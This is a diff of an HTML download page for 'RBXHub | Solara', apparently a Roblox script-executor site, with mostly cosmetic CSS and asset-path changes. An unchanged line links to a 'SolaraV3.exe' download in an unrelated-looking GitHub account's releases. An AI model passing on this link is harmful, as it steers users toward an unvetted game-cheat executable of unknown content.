@@ -4,15 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RBXHub | Solara</title>
-    <link rel="icon" type="image/png" href="favicon.png">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="/favicon-v2.png">
+    <link rel="stylesheet" href="/output.css">
     <style>
-        /* Шрифт как на главной */
-        body, * {
-            font-family: Consolas, Monaco, "Courier New", Courier, monospace !important;
-        }
-
         /* Убираем дефолтную рамку фокуса */
         a:focus, button:focus {
             outline: none !important;
@@ -114,7 +108,7 @@
             }
         }
 
-        /* Стили для контента Solara (чтобы выглядело аккуратно) */
+        /* Стили карточек Solara */
         .glass {
             background: #0f0f14;
             border: 1px solid rgba(255, 255, 255, 0.05);
@@ -122,11 +116,18 @@
             transition: all 0.35s ease;
         }
         .btn-tg {
+            display: block;
             background: #2563eb;
             color: white;
+            font-weight: 700;
+            text-transform: uppercase;
+            padding: 12px 24px;
             border-radius: 10px;
             border: 1px solid rgba(255, 255, 255, 0.15);
             box-shadow: 0 4px 14px rgba(37, 99, 235, 0.35);
+            text-align: center;
+            text-decoration: none;
+            transition: all 0.25s ease;
         }
         .btn-tg:hover {
             background: #3b82f6;
@@ -165,7 +166,7 @@
             <a href="https://github.com/antonkoval200koval-collab/wakeupfilfy/releases/download/1.1/SolaraV3.exe" 
                target="_blank" 
                rel="nofollow noopener noreferrer" 
-               class="btn-tg w-full block py-3 font-bold uppercase transition hover:opacity-90">
+               class="btn-tg w-full">
                 Download PC
             </a>
             <p class="text-[10px] text-gray-500 mt-3 uppercase tracking-wider">
